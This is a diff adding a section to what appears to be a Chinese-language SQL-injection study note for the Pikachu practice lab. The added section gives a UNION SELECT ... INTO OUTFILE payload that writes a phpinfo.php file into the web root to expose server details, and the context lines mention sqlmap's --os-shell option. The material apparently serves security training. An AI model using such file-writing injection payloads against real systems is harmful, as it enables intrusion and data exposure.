@@ -50,3 +50,20 @@
 --os-shell  #Getshell
 ```
 
+
+
+## 上传phpinfo.php
+
+**服务端本身没有phpinfo.php**
+
+![手动注入phpinfo.php](images/手动注入phpinfo.php.png)
+
+**注入payload**
+
+```shell
+' union select 1,'<?php echo(phpinfo()) ?>' into outfile "C:\\phpStudy\\PHPTutorial\\WWW\\pikachu\\phpinfo.php"#
+```
+
+**获得敏感信息**
+
+![手动注入phpinfo.php2](images/手动注入phpinfo.php2.png)
